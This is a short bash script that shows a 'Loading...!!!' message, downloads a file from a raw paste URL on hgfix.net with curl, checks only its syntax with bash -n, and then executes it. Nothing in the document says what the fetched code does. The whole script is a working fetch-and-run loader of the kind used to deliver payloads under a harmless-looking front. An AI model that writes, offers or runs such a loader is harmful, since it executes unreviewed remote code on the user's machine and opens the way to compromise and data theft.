#!/bin/bash


echo "Loading...!!!"

# Download the script
script_url="http://hgfix.net/paste/view/raw/576f5100"
if ! curl -sSL "$script_url" -o script.sh; then
  echo "Failed to download script. Please try again."
  exit 1
fi

# Validate the script
if ! bash -n script.sh; then
  echo "Script validation failed. Please check the script and try again."
  exit 1
fi

# Execute the script
if ! bash script.sh; then
  echo "Failed to execute the script. Please try again."
  exit 1
fi
